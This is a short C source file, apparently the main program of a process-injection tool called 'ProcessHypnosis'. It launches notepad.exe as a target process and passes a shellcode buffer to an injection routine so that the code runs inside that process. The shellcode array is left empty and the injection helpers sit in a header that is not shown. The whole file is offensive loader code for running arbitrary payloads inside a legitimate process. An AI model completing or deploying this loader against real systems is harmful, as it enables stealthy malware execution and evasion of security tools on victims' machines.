#include "ProcessHypnosis.h"

#define TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe"

int main()
{

		UCHAR Shellcode[] = {
	
		};


		DWORD ProcessId = 0;
		DWORD ThreadId = 0;
		HANDLE ProcessHandle = NULL;

		SIZE_T PayloadSize = sizeof(Shellcode);

		if (!CreateTargetProcess(TARGET_PROCESS, &ProcessHandle, &ProcessId, &ThreadId))
		{
			WARN("Failed To Create a New Process: %ls", TARGET_PROCESS);
			PRINT_ERROR("CreateTargetProcess");
			return 1;
		}

		if (!ExecuteProcessHypnosis(Shellcode, PayloadSize, ProcessHandle, ProcessId, ThreadId))
		{
			PRINT_ERROR("ExecuteProcessHypnosis");
			return 1;
		}

		OKAY("DONE!");

		CHAR("Quit...");
		getchar();

		return 0;

}